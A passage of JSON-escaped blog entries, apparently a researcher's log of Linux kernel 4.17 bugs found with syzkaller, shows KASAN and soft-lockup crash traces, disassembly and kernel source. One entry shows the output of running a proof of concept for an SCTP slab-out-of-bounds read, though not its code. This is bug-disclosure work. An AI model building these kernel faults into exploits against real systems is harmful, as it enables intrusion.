7e fa ff \n```\n\nI'll update a post later...\n\n**End**\n\n","excerpt":"create_filter - memory leak Found on LK v4.17.x. kmemleak message pcpu_create_chunk - memory leak Found on LK v4.17.x. kmemleak message set…","fields":{"slug":"/2018-06-2-Founds/"},"frontmatter":{"date":"Jun 12, 2018","title":"Linux Kernel - 2018-06-2 Founds","tags":["Security","Linux-Kernel"],"update":"Jun 16, 2018"},"timeToRead":12}},{"node":{"rawMarkdownBody":"\n## __sctp_v6_cmp_addr - slab out of bounds Read\n\nFound in *LK v4.17.0-rc1*. \n\nslab-out-of-bounds in __sctp_v6_cmp_addr, 8 bytes read.\n\n### Demo Log\n\n```c\nzero@zer0day:/tmp$ gcc -o poc poc.c\nzero@zer0day:/tmp$ ./poc\n[   53.074578] ==================================================================\n[   53.077133] BUG: KASAN: slab-out-of-bounds in __sctp_v6_cmp_addr+0x3e4/0x440\n[   53.079233] Read of size 8 at addr ffff880066c03530 by task poc/2777\n[   53.081111] \n[   53.081589] CPU: 1 PID: 2777 Comm: poc Not tainted 4.17.0-rc1+ #34\n[   53.083186] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\n[   53.085896] Call Trace:\n[   53.086652]  dump_stack+0x11b/0x1fd\n[   53.087714]  ? dump_stack_print_info.cold.0+0x81/0x81\n[   53.089250]  ? kmsg_dump_rewind_nolock+0xd9/0xd9\n[   53.090597]  ? sctp_bind_addr_conflict+0xf5/0x450\n[   53.091913]  print_address_description+0x60/0x255\n[   53.093161]  kasan_report+0x196/0x2a0\n[   53.094020]  ? __sctp_v6_cmp_addr+0x3e4/0x440\n[   53.095031]  ? __sctp_v6_cmp_addr+0x3e4/0x440\n[   53.096037]  ? sctp_inet6_cmp_addr+0x12c/0x170\n[   53.097070]  ? sctp_bind_addr_conflict+0x25c/0x450\n[   53.098160]  ? sctp_bind_addr_match+0x3b0/0x3b0\n[   53.099339]  ? sctp_get_port_local+0x884/0x1320\n[   53.100532]  ? sctp_set_owner_w+0x4f0/0x4f0\n[   53.101680]  ? rcu_is_watching+0x81/0x130\n[   53.102749]  ? inet_addr_type+0x250/0x360\n[   53.103853]  ? sctp_bind_addr_match+0x280/0x3b0\n[   53.105093]  ? sctp_bind_addrs_to_raw+0x310/0x310\n[   53.106378]  ? sctp_v4_available+0xee/0x1c0\n[   53.107552]  ? sctp_do_bind+0x259/0x680\n[   53.108612]  ? sctp_bindx_add+0x93/0x1b0\n[   53.109767]  ? sctp_setsockopt_bindx+0x16c/0x2e0\n[   53.111023]  ? sctp_setsockopt+0x251b/0x61d0\n[   53.112119]  ? __lock_acquire+0x9f2/0x4840\n[   53.112977]  ? sctp_setsockopt_paddr_thresholds+0x4e0/0x4e0\n[   53.114445]  ? unwind_next_frame+0x11c2/0x1d10\n[   53.115618]  ? __save_stack_trace+0x59/0xf0\n[   53.116740]  ? debug_check_no_locks_freed+0x210/0x210\n[   53.118064]  ? do_syscall_64+0x148/0x5d0\n[   53.119163]  ? unwind_next_frame+0x286/0x1d10\n[   53.120400]  ? __x64_sys_socket+0x6f/0xb0\n[   53.121504]  ? deref_stack_reg+0x110/0x110\n[   53.122664]  ? find_held_lock+0x32/0x1b0\n[   53.123787]  ? __save_stack_trace+0x7d/0xf0\n[   53.124999]  ? do_syscall_64+0x148/0x5d0\n[   53.126094]  ? save_stack+0x89/0xb0\n[   53.127069]  ? kasan_kmalloc+0xbf/0xe0\n[   53.128071]  ? kmem_cache_alloc+0xf0/0x2b0\n[   53.129086]  ? selinux_file_alloc_security+0xa9/0x180\n[   53.130808]  ? security_file_alloc+0x42/0x90\n[   53.132377]  ? get_empty_filp+0x194/0x4e0\n[   53.133657]  ? alloc_file+0x24/0x3a0\n[   53.135352]  ? sock_alloc_file+0x1f5/0x4c0\n[   53.136794]  ? __sys_socket+0x136/0x1f0\n[   53.138026]  ? __x64_sys_socket+0x6f/0xb0\n[   53.139260]  ? do_syscall_64+0x148/0x5d0\n[   53.140431]  ? create_object+0x7b2/0xb40\n[   53.141664]  ? start_scan_thread+0x70/0x70\n[   53.142866]  ? selinux_file_alloc_security+0xa9/0x180\n[   53.144341]  ? debug_mutex_init+0x17/0x60\n[   53.145512]  ? save_trace+0x300/0x300\n[   53.146648]  ? debug_mutex_init+0x28/0x60\n[   53.147752]  ? __mutex_init+0x1e0/0x260\n[   53.148740]  ? housekeeping_affine+0x20/0x20\n[   53.149854]  ? find_held_lock+0x32/0x1b0\n[   53.150944]  ? __fd_install+0x267/0x6e0\n[   53.152013]  ? lock_acquire+0x4a0/0x4a0\n[   53.153035]  ? lock_downgrade+0x6e0/0x6e0\n[   53.154083]  ? rcu_is_watching+0x81/0x130\n[   53.155140]  ? sock_has_perm+0x275/0x370\n[   53.156171]  ? selinux_secmark_relabel_packet+0xc0/0xc0\n[   53.157567]  ? fget_raw+0x20/0x20\n[   53.158481]  ? selinux_netlbl_socket_setsockopt+0xf1/0x430\n[   53.159909]  ? selinux_netlbl_sock_rcv_skb+0x600/0x600\n[   53.161257]  ? selinux_socket_setsockopt+0x5d/0x70\n[   53.162504]  ? __sys_setsockopt+0x160/0x340\n[   53.163592]  ? kernel_accept+0x2f0/0x2f0\n[   53.164657]  ? __sys_socket+0x156/0x1f0\n[   53.165680]  ? lock_acquire+0x4a0/0x4a0\n[   53.166683]  ? __x64_sys_setsockopt+0xba/0x150\n[   53.167834]  ? do_syscall_64+0x148/0x5d0\n[   53.168834]  ? syscall_return_slowpath+0x470/0x470\n[   53.170045]  ? syscall_return_slowpath+0x2df/0x470\n[   53.171320]  ? prepare_exit_to_usermode+0x330/0x330\n[   53.172597]  ? entry_SYSCALL_64_after_hwframe+0x59/0xbe\n[   53.174020]  ? trace_hardirqs_off_thunk+0x1a/0x1c\n[   53.175280]  ? entry_SYSCALL_64_after_hwframe+0x49/0xbe\n[   53.176729] \n[   53.177195] Allocated by task 2777:\n[   53.178120]  kasan_kmalloc+0xbf/0xe0\n[   53.179056]  __kmalloc_node+0x14a/0x4a0\n[   53.180062]  kvmalloc_node+0xa2/0xe0\n[   53.181051]  vmemdup_user+0x28/0x90\n[   53.181992]  sctp_setsockopt_bindx+0x5b/0x2e0\n[   53.183087]  sctp_setsockopt+0x251b/0x61d0\n[   53.184136] \n[   53.184542] Freed by task 1186:\n[   53.185433]  __kasan_slab_free+0x125/0x170\n[   53.186504]  kfree+0x10c/0x360\n[   53.187290] \n[   53.187714] The buggy address belongs to the object at ffff880066c03520\n[   53.187714]  which belongs to the cache kmalloc-16 of size 16\n[   53.190837] The buggy address is located 0 bytes to the right of\n[   53.190837]  16-byte region [ffff880066c03520, ffff880066c03530)\n[   53.193987] The buggy address belongs to the page:\n[   53.195253] page:ffffea00019b0080 count:1 mapcount:0 mapping:0000000000000000 index:0x0 compound_mapcount: 0\n[   53.197773] flags: 0x100000000008100(slab|head)\n[   53.198972] raw: 0100000000008100 0000000000000000 0000000000000000 0000000100160016\n[   53.200961] raw: ffffea000199d8a0 ffff880066c004a0 ffff880066c0fa00 0000000000000000\n[   53.202891] page dumped because: kasan: bad access detected\n[   53.204040] \n[   53.204407] Memory state around the buggy address:\n[   53.205733]  ffff880066c03400: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc\n[   53.208193]  ffff880066c03480: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc\n[   53.210926] >ffff880066c03500: fc fc fc fc 00 00 fc fc fc fc fc fc fc fc fc fc\n[   53.213639]                                      ^\n[   53.215473]  ffff880066c03580: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc\n[   53.218217]  ffff880066c03600: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc\n[   53.220957] ==================================================================\n[   53.223428] Disabling lock debugging due to kernel taint\n\nMessage from syslogd@zer0day at Apr 21 11:06:20 ...\n kernel:[   53.195253] page:ffffea00019b0080 count:1 mapcount:0 mapping:0000000000000000 index:0x0 compound_mapcount: 0\n\nMessage from syslogd@zer0day at Apr 21 11:06:20 ...\n kernel:[   53.197773] flags: 0x100000000008100(slab|head)\n\nzero@zer0day:/tmp$ uname -a\nLinux zer0day 4.17.0-rc1+ #34 SMP Sat Apr 21 17:01:13 KST 2018 x86_64 GNU/Linux\n```\n\n**End**\n\n\n\n## shrink_dcache_parent - soft lockup\n\nGot from syzkaller & Found in LK v4.17.0-rc1.\n\nSimilar symptom [prev ver patch](https://patchwork.kernel.org/patch/4245861/)\n\n### Call Trace (Dump)\n\n```c\n[  124.038017] watchdog: BUG: soft lockup - CPU#0 stuck for 22s! [syz-executor2:2903]\n[  124.039236] Modules linked in:\n[  124.039711] irq event stamp: 14111350\n[  124.040168] hardirqs last  enabled at (14111349): [<ffffffffa3406b6a>] d_walk+0x18a/0xa60\n[  124.041330] hardirqs last disabled at (14111350): [<ffffffffa5800964>] interrupt_entry+0xc4/0xe0\n[  124.042453] softirqs last  enabled at (433182): [<ffffffffa5a006f6>] __do_softirq+0x6f6/0xa8b\n[  124.043551] softirqs last disabled at (433143): [<ffffffffa2d539fb>] irq_exit+0x19b/0x1c0\n[  124.044616] CPU: 0 PID: 2903 Comm: syz-executor2 Not tainted 4.17.0-rc1+ #34\n[  124.045502] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\n[  124.046627] RIP: 0010:d_walk+0x12c/0xa60\n[  124.047135] RSP: 0018:ffff8800438dfa50 EFLAGS: 00000293 ORIG_RAX: ffffffffffffff13\n[  124.048114] RAX: 0000000000000293 RBX: dffffc0000000000 RCX: ffffffffa3406b0a\n[  124.049073] RDX: 0000000000000000 RSI: ffff8800438dfc10 RDI: ffff8800438dfae0\n[  124.050000] RBP: ffff8800438dfbc8 R08: ffffed000c020c12 R09: ffffed000c020c11\n[  124.050796] R10: ffff88006010608b R11: 1ffff1000c020c11 R12: ffffed000871bf85\n[  124.051594] R13: ffff8800438dfc50 R14: ffffffffa33fdae0 R15: dffffc0000000000\n[  124.052399] FS:  0000000002648940(0000) GS:ffff88006d000000(0000) knlGS:0000000000000000\n[  124.053300] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033\n[  124.053946] CR2: 0000000002651c18 CR3: 00000000438ce000 CR4: 00000000000006f0\n[  124.054744] DR0: 0000000020000100 DR1: 0000000020000100 DR2: 0000000000000000\n[  124.055542] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000600\n[  124.056342] Call Trace:\n[  124.056649]  ? __d_free_external+0x60/0x60\n[  124.057131]  ? dget_parent+0x5b0/0x5b0\n[  124.057565]  ? shrink_dentry_list+0x416/0x6a0\n[  124.058078]  ? is_subdir+0x320/0x320\n[  124.058496]  ? shrink_dcache_parent+0xc1/0x210\n[  124.059008]  shrink_dcache_parent+0x164/0x210\n[  124.059512]  ? path_has_submounts+0x1a0/0x1a0\n[  124.060018]  ? down_write+0x91/0x130\n[  124.060439]  ? vfs_rmdir+0xd0/0x420\n[  124.060862]  vfs_rmdir+0x1cf/0x420\n[  124.061266]  do_rmdir+0x3fa/0x5a0\n[  124.061663]  ? __ia32_sys_mkdir+0x80/0x80\n[  124.062125]  ? exit_to_usermode_loop+0x139/0x1e0\n[  124.062657]  ? exit_to_usermode_loop+0x181/0x1e0\n[  124.063189]  ? __ia32_compat_sys_getdents+0x4a0/0x4a0\n[  124.063764]  ? syscall_slow_exit_work+0x400/0x400\n[  124.064303]  ? do_syscall_64+0x8f/0x5d0\n[  124.064755]  do_syscall_64+0x148/0x5d0\n[  124.065185]  ? syscall_slow_exit_work+0x400/0x400\n[  124.065719]  ? syscall_return_slowpath+0x470/0x470\n[  124.066307]  ? syscall_return_slowpath+0x2df/0x470\n[  124.066925]  ? entry_SYSCALL_64_after_hwframe+0x59/0xbe\n[  124.067518]  ? trace_hardirqs_off_thunk+0x1a/0x1c\n[  124.068012] watchdog: BUG: soft lockup - CPU#1 stuck for 22s! [syz-executor3:7303]\n[  124.068067]  ? entry_SYSCALL_64_after_hwframe+0x49/0xbe\n[  124.068785] Modules linked in:\n[  124.069398] Code: \n[  124.069690] irq event stamp: 14006166\n[  124.069698] hardirqs last  enabled at (14006165): [<ffffffffa3406b6a>] d_walk+0x18a/0xa60\n[  124.069936] f8 \n[  124.070308] hardirqs last disabled at (14006166): [<ffffffffa5800964>] interrupt_entry+0xc4/0xe0\n[  124.070315] softirqs last  enabled at (784694): [<ffffffffa5a006f6>] __do_softirq+0x6f6/0xa8b\n[  124.071217] 48 \n[  124.071404] softirqs last disabled at (784609): [<ffffffffa2d539fb>] irq_exit+0x19b/0x1c0\n[  124.071410] CPU: 1 PID: 7303 Comm: syz-executor3 Not tainted 4.17.0-rc1+ #34\n[  124.072394] 89 \n[  124.073219] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\n[  124.073226] RIP: 0010:lock_acquire+0x1f3/0x4a0\n[  124.073422] 85 \n[  124.074135] RSP: 0018:ffff88006a03f950 EFLAGS: 00000246 ORIG_RAX: ffffffffffffff13\n[  124.074856] e8 \n[  124.075020] RAX: 0000000000000007 RBX: 1ffff1000d407f2e RCX: 0000000000000000\n[  124.075024] RDX: 0000000000000000 RSI: 0000000000000000 RDI: 0000000000000246\n[  124.075928] fe \n[  124.076329] RBP: ffff88006c24c540 R08: 0000000000000000 R09: 0000000000000004\n[  124.076333] R10: ffff88006c24ce10 R11: 0000000000000001 R12: 0000000000000000\n[  124.076525] ff \n[  124.077184] R13: 0000000000000002 R14: 0000000000000000 R15: 0000000000000000\n[  124.077189] FS:  00000000019eb940(0000) GS:ffff88006d100000(0000) knlGS:0000000000000000\n[  124.077382] ff \n[  124.077998] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033\n[  124.078003] CR2: 00007ffd885fff88 CR3: 00000000645ec000 CR4: 00000000000006e0\n[  124.078729] e8 \n[  124.078895] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000\n[  124.079620] 72 \n[  124.080248] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400\n[  124.080251] Call Trace:\n[  124.080444] 1c \n[  124.081078]  ? lock_downgrade+0x6e0/0x6e0\n[  124.081891] c2 \n[  124.082063]  ? do_raw_spin_trylock+0x1b0/0x1b0\n[  124.082076]  ? mark_held_locks+0xa8/0xf0\n[  124.082656] ff \n[  124.083283]  d_walk+0x41b/0xa60\n[  124.083468] 48 \n[  124.084091]  ? d_walk+0x3ea/0xa60\n[  124.084408] 8b \n[  124.085135]  ? __d_free_external+0x60/0x60\n[  124.085426] 85 \n[  124.085611]  ? dget_parent+0x5b0/0x5b0\n[  124.086058] e8 \n[  124.086247]  ? shrink_dentry_list+0x416/0x6a0\n[  124.086746] fe \n[  124.087139]  ? is_subdir+0x320/0x320\n[  124.087348] ff \n[  124.087665]  ? shrink_dcache_parent+0xc1/0x210\n[  124.087869] ff \n[  124.088211]  shrink_dcache_parent+0x164/0x210\n[  124.088413] c6 \n[  124.088866]  ? path_has_submounts+0x1a0/0x1a0\n[  124.089083] 00 \n[  124.089489]  ? down_write+0x91/0x130\n[  124.089724] 04 \n[  124.090189]  ? vfs_rmdir+0xd0/0x420\n[  124.090205]  vfs_rmdir+0x1cf/0x420\n[  124.090411] f6 \n[  124.090808]  do_rmdir+0x3fa/0x5a0\n[  124.091085] 85 \n[  124.091639]  ? __ia32_sys_mkdir+0x80/0x80\n[  124.091841] 18 \n[  124.092282]  ? exit_to_usermode_loop+0x139/0x1e0\n[  124.092486] ff \n[  124.092913]  ? exit_to_usermode_loop+0x181/0x1e0\n[  124.093126] ff \n[  124.093476]  ? __ia32_compat_sys_getdents+0x4a0/0x4a0\n[  124.093482]  ? syscall_slow_exit_work+0x400/0x400\n[  124.093695] ff \n[  124.094044]  ? do_syscall_64+0x8f/0x5d0\n[  124.094416] 01 \n[  124.094608]  do_syscall_64+0x148/0x5d0\n[  124.094983] 0f \n[  124.095169]  ? syscall_slow_exit_work+0x400/0x400\n[  124.095622] 85 \n[  124.095805]  ? syscall_return_slowpath+0x470/0x470\n[  124.096336] ea \n[  124.096561]  ? syscall_return_slowpath+0x2df/0x470\n[  124.097132] 00 \n[  124.097355]  ? entry_SYSCALL_64_after_hwframe+0x59/0xbe\n[  124.097950] 00 \n[  124.098512]  ? trace_hardirqs_off_thunk+0x1a/0x1c\n[  124.098732] 00 \n[  124.099195]  ? entry_SYSCALL_64_after_hwframe+0x49/0xbe\n[  124.099412] e8 \n[  124.099860] Code: \n[  124.100068] 56 \n[  124.100632] ea \n[  124.100861] 1c \n[  124.101334] 03 \n[  124.101556] c2 \n[  124.102018] 0f b6 \n[  124.102247] ff \n[  124.102755] 14 02 \n[  124.102985] 9c \n[  124.103446] 48 89 \n[  124.103675] 58 \n[  124.104190] f8 83 \n[  124.104421] <0f> \n[  124.104626] e0 07 \n[  124.104855] 1f \n[  124.105034] 83 \n[  124.105257] 44 \n[  124.105442] c0 \n[  124.105669] 00 \n[  124.105874] 03 38 \n[  124.106105] 00 \n[  124.106309] d0 7c \n[  124.106536] 48 \n[  124.106739] 08 84 \n[  124.106968] 89 \n[  124.107173] d2 0f \n[  124.107425] c3 \n[  124.107631] 85 3f \n[  124.107874] fa \n[  124.108057] 02 00 \n[  124.108297] 66 \n[  124.108477] 00 c7 \n[  124.108706] 0f \n[  124.108910] 85 2c \n[  124.109140] 1f \n[  124.109344] 08 00 \n[  124.109569] 44 \n[  124.109773] 00 00 \n[  124.110004] 00 \n[  124.110210] 00 00 \n[  124.110438] 00 \n[  124.110641] 00 48 \n[  124.110875] e8 \n[  124.111089] 8b \n[  124.111309] 90 \n[  124.111556] 3c \n[  124.111783] c9 \n[  124.112030] 24 \n[  124.112250] a6 ff \n[  124.112481] 57 \n[  124.112677] ff \n[  124.112899] 9d <0f> \n[  124.115848] 1f 44 00 00 48 b8 00 00 00 00 00 fc ff df 48 01 c3 48 c7 03 \n```\n\n### Code\n\n```c\n   0:   1c c2                   sbb    al,0xc2\n   2:   ff 48 8b                dec    DWORD PTR [rax-0x75]\n   5:   85 e8                   test   eax,ebp\n   7:   fe                      (bad)  \n   8:   ff                      (bad)  \n   9:   ff c6                   inc    esi\n   b:   00 04 f6                add    BYTE PTR [rsi+rsi*8],al\n   e:   85 18                   test   DWORD PTR [rax],ebx\n  10:   ff                      (bad)  \n  11:   ff                      (bad)  \n  12:   ff 01                   inc    DWORD PTR [rcx]\n  14:  *0f 85 ea 00 00 00       jne    0x104\n  1a:   e8 56 ea 1c 03          call   0x31cea75\n  1f:   c2 0f b6                ret    0xb60f\n  22:   ff 14 02                call   QWORD PTR [rdx+rax*1]\n  25:   9c                      pushf  \n  26:   48 89 58 f8             mov    QWORD PTR [rax-0x8],rbx\n  2a:   83 0f e0                or     DWORD PTR [rdi],0xffffffe0\n  2d:   07                      (bad)  \n  2e:   1f                      (bad)  \n  2f:   83 44 c0 00 03          add    DWORD PTR [rax+rax*8+0x0],0x3\n  34:   38 00                   cmp    BYTE PTR [rax],al\n  36:   d0 7c 48 08             sar    BYTE PTR [rax+rcx*2+0x8],1\n  3a:   84 89 d2 0f c3 85       test   BYTE PTR [rcx-0x7a3cf02e],cl\n  40:   3f                      (bad)  \n  41:   fa                      cli    \n  42:   02 00                   add    al,BYTE PTR [rax]\n  44:   66 00 c7                data16 add bh,al\n  47:   0f 85 2c 1f 08 00       jne    0x81f79\n  4d:   44 00 00                add    BYTE PTR [rax],r8b\n  50:   00 00                   add    BYTE PTR [rax],al\n  52:   00 00                   add    BYTE PTR [rax],al\n  54:   00 48 e8                add    BYTE PTR [rax-0x18],cl\n  57:   8b 90 3c c9 24 a6       mov    edx,DWORD PTR [rax-0x59db36c4]\n  5d:   ff 57 ff                call   QWORD PTR [rdi-0x1]\n  60:   9d                      popf   \n  61:  *0f 1f 44 00 00          nop    DWORD PTR [rax+rax*1+0x0]\n  66:   48 b8 00 00 00 00 00    movabs rax,0xdffffc0000000000\n  6d:   fc ff df \n  70:   48 01 c3                add    rbx,rax\n  73:   48                      rex.W\n  74:   c7                      .byte 0xc7\n  75:   03                      .byte 0x3\n```\n\nlooks not good... :(\n\n### Source\n\n```c\n...\nstatic void shrink_dentry_list(struct list_head *list)\n{\n\tstruct dentry *dentry, *parent;\n\n\twhile (!list_empty(list)) {\n\t\tstruct inode *inode;\n\t\tdentry = list_entry(list->prev, struct dentry, d_lru);\n\t\tspin_lock(&dentry->d_lock);\n\t\tparent = lock_parent(dentry);\n\n\t\t/*\n\t\t * The dispose list is isolated and dentries are not accounted\n\t\t * to the LRU here, so we can simply remove it from the list\n\t\t * here regardless of whether it is referenced or not.\n\t\t */\n\t\td_shrink_del(dentry);\n\n\t\t/*\n\t\t * We found an inuse dentry which was not removed from\n\t\t * the LRU because of laziness during lookup. Do not free it.\n\t\t */\n\t\tif (dentry->d_lockref.count > 0) {\n\t\t\tspin_unlock(&dentry->d_lock);\n\t\t\tif (parent)\n\t\t\t\tspin_unlock(&parent->d_lock);\n\t\t\tcontinue;\n\t\t}\n\n\n\t\tif (unlikely(dentry->d_flags & DCACHE_DENTRY_KILLED)) {\n\t\t\tbool can_free = dentry->d_flags & DCACHE_MAY_FREE;\n\t\t\tspin_unlock(&dentry->d_lock);\n\t\t\tif (parent)\n\t\t\t\tspin_unlock(&parent->d_lock);\n\t\t\tif (can_free)\n\t\t\t\tdentry_free(dentry);\n\t\t\tcontinue;\n\t\t}\n\n\t\tinode = dentry->d_inode;\n\t\tif (inode && unlikely(!spin_trylock(&inode->i_lock))) {\n\t\t\td_shrink_add(dentry, list);\n\t\t\tspin_unlock(&dentry->d_lock);\n\t\t\tif (parent)\n\t\t\t\tspin_unlock(&parent->d_lock);\n\t\t\tcontinue;\n\t\t}\n\n\t\t__dentry_kill(dentry);\n\n\t\t/*\n\t\t * We need to prune ancestors too. This is necessary to prevent\n\t\t * quadratic behavior of shrink_dcache_parent(), but is also\n\t\t * expected to be beneficial in reducing dentry cache\n\t\t * fragmentation.\n\t\t */\n\t\tdentry = parent;\n\t\twhile (dentry && !lockref_put_or_lock(&dentry->d_lockref)) {\n\t\t\tparent = lock_parent(dentry);\n\t\t\tif (dentry->d_lockref.count != 1) {\n\t\t\t\tdentry->d_lockref.count--;\n\t\t\t\tspin_unlock(&dentry->d_lock);\n\t\t\t\tif (parent)\n\t\t\t\t\tspin_unlock(&parent->d_lock);\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tinode = dentry->d_inode;\t/* can't be NULL */\n\t\t\tif (unlikely(!spin_trylock(&inode->i_lock))) {\n\t\t\t\tspin_unlock(&dentry->d_lock);\n\t\t\t\tif (parent)\n\t\t\t\t\tspin_unlock(&parent->d_lock);\n\t\t\t\tcpu_relax();\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\t__dentry_kill(dentry);\n\t\t\tdentry = parent;\n\t\t}\n\t}\n}\n...\n/**\n * shrink_dcache_parent - prune dcache\n * @parent: parent of entries to prune\n *\n * Prune the dcache to remove unused children of the parent dentry.\n */\nvoid shrink_dcache_parent(struct dentry *parent)\n{\n\tfor (;;) {\n\t\tstruct select_data data;\n\n\t\tINIT_LIST_HEAD(&data.dispose);\n\t\tdata.start = parent;\n\t\tdata.found = 0;\n\n\t\td_walk(parent, &data, select_collect, NULL);\n\t\tif (!data.found)\n\t\t\tbreak;\n\n\t\tshrink_dentry_list(&data.dispose);\n\t\tcond_resched();\n\t}\n}\nEXPORT_SYMBOL(shrink_dcache_parent);\n...\nstruct dentry *dget_parent(struct dentry *dentry)\n{\n\tint gotref;\n\tstruct dentry *ret;\n\n\t/*\n\t * Do optimistic parent lookup without any\n\t * locking.\n\t */\n\trcu_read_lock();\n\tret = READ_ONCE(dentry->d_parent);\n\tgotref = lockref_get_not_zero(&ret->d_lockref);\n\trcu_read_unlock();\n\tif (likely(gotref)) {\n\t\tif (likely(ret == READ_ONCE(dentry->d_parent)))\n\t\t\treturn ret;\n\t\tdput(ret);\n\t}\n\nrepeat:\n\t/*\n\t * Don't need rcu_dereference because we re-check it was correct under\n\t * the lock.\n\t */\n\trcu_read_lock();\n\tret = dentry->d_parent;\n\tspin_lock(&ret->d_lock);\n\tif (unlikely(ret != dentry->d_parent)) {\n\t\tspin_unlock(&ret->d_lock);\n\t\trcu_read_unlock();\n\t\tgoto repeat;\n\t}\n\trcu_read_unlock();\n\tBUG_ON(!ret->d_lockref.count);\n\tret->d_lockref.count++;\n\tspin_unlock(&ret->d_lock);\n\treturn ret;\n}\nEXPORT_SYMBOL(dget_parent);\n...\n```\n\nI'll comment later about the codes...\n\n\n**End**\n\n\n\n\n## unregister_netdevice - waiting for DEV to become free\n\nGot from syzkaller & Found in LK v4.17.0-rc1.\n\n### Call Trace (Dump)\n\n```c\n...\n[  292.993864] unregister_netdevice: waiting for lo to become free. Usage count = 5\n...\n```\n\n## ata_scsi_queuecmd - soft lockup\n\nGot from syzkaller & Found in LK v4.17.0-rc1.\n\n### Call Trace (Dump)\n\n```c\n...\nwatchdog: BUG: soft lockup - CPU#0 stuck for 22s! [kworker/0:1:23]\nModules linked in:\nirq event stamp: 223171\nhardirqs last  enabled at (223170): [<ffffffff9c92d7a6>] __raw_spin_unlock_irqrestore include/linux/spinlock_api_smp.h:160 [inline]\nhardirqs last  enabled at (223170): [<ffffffff9c92d7a6>] _raw_spin_unlock_irqrestore+0x46/0x60 kernel/locking/spinlock.c:184\nhardirqs last disabled at (223171): [<ffffffff9ca00964>] interrupt_entry+0xc4/0xe0 arch/x86/entry/entry_64.S:625\nsoftirqs last  enabled at (223104): [<ffffffff9cc006f6>] __do_softirq+0x6f6/0xa8b kernel/softirq.c:311\nsoftirqs last disabled at (223133): [<ffffffff99f539fb>] invoke_softirq kernel/softirq.c:365 [inline]\nsoftirqs last disabled at (223133): [<ffffffff99f539fb>] irq_exit+0x19b/0x1c0 kernel/softirq.c:405\nCPU: 0 PID: 23 Comm: kworker/0:1 Not tainted 4.17.0-rc1+ #34\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\nWorkqueue: events e1000_watchdog\nRIP: 0010:arch_local_irq_restore arch/x86/include/asm/paravirt.h:783 [inline]\nRIP: 0010:__raw_spin_unlock_irqrestore include/linux/spinlock_api_smp.h:160 [inline]\nRIP: 0010:_raw_spin_unlock_irqrestore+0x4b/0x60 kernel/locking/spinlock.c:184\nRSP: 0018:ffff88006d006bd8 EFLAGS: 00000246 ORIG_RAX: ffffffffffffff13\nRAX: 0000000000000007 RBX: 0000000000000246 RCX: 0000000000000000\nRDX: 0000000000000000 RSI: 0000000000000000 RDI: 0000000000000246\nRBP: ffff880064c1b2a8 R08: ffffed000c983656 R09: ffff88006c074db8\nR10: 0000000000000000 R11: 0000000000000000 R12: ffffffff9b6faf30\nR13: ffff880064e58000 R14: 000000000000000a R15: ffff880064e58010\nFS:  0000000000000000(0000) GS:ffff88006d000000(0000) knlGS:0000000000000000\nCS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033\nCR2: 0000000000a0e0f8 CR3: 00000000676c0000 CR4: 00000000000006f0\nDR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000\nDR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400\nCall Trace:\n <IRQ>\n spin_unlock_irqrestore include/linux/spinlock.h:365 [inline]\n ata_scsi_queuecmd+0x2d7/0x690 drivers/ata/libata-scsi.c:4389\n scsi_dispatch_cmd+0x390/0xb10 drivers/scsi/scsi_lib.c:1761\n scsi_request_fn+0xba0/0x1be0 drivers/scsi/scsi_lib.c:1899\n </IRQ>\nwatchdog: BUG: soft lockup - CPU#1 stuck for 23s! [logrotate:2850]\nModules linked in:\nirq event stamp: 253398\nhardirqs last  enabled at (253397): [<ffffffff9ca00a60>] restore_regs_and_return_to_kernel+0x0/0x30\nhardirqs last disabled at (253398): [<ffffffff9ca00964>] interrupt_entry+0xc4/0xe0 arch/x86/entry/entry_64.S:625\nsoftirqs last  enabled at (253396): [<ffffffff9cc006f6>] __do_softirq+0x6f6/0xa8b kernel/softirq.c:311\nsoftirqs last disabled at (253389): [<ffffffff99f539fb>] invoke_softirq kernel/softirq.c:365 [inline]\nsoftirqs last disabled at (253389): [<ffffffff99f539fb>] irq_exit+0x19b/0x1c0 kernel/softirq.c:405\nCPU: 1 PID: 2850 Comm: logrotate Not tainted 4.17.0-rc1+ #34\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\nRIP: 0010:rep_nop arch/x86/include/asm/processor.h:667 [inline]\nRIP: 0010:cpu_relax arch/x86/include/asm/processor.h:672 [inline]\nRIP: 0010:csd_lock_wait kernel/smp.c:108 [inline]\nRIP: 0010:smp_call_function_single+0x3b8/0x510 kernel/smp.c:302\nRSP: 0018:ffff8800625cf4c0 EFLAGS: 00000293\n ORIG_RAX: ffffffffffffff13\nRAX: ffff880066781740 RBX: ffff8800625cf538 RCX: ffffffff9a17e0e6\nRDX: 0000000000000000 RSI: 0000000000000000 RDI: ffff8800625cf538\nRBP: ffff8800625cf620 R08: ffffed000da05791 R09: ffff880066781f90\nCode: \nR10: 0000000000000000 R11: 0000000000000000 R12: 0000000000000001\nR13: dffffc0000000000 R14: 0000000000000000 R15: ffffed000c4b9eb4\n51 \nFS:  00007faffc8de7a0(0000) GS:ffff88006d100000(0000) knlGS:0000000000000000\n76 fd \nCS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033\nCR2: 00007faffc8e3000 CR3: 00000000676c0000 CR4: 00000000000006e0\nf6 c7 \nDR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000\n02 75 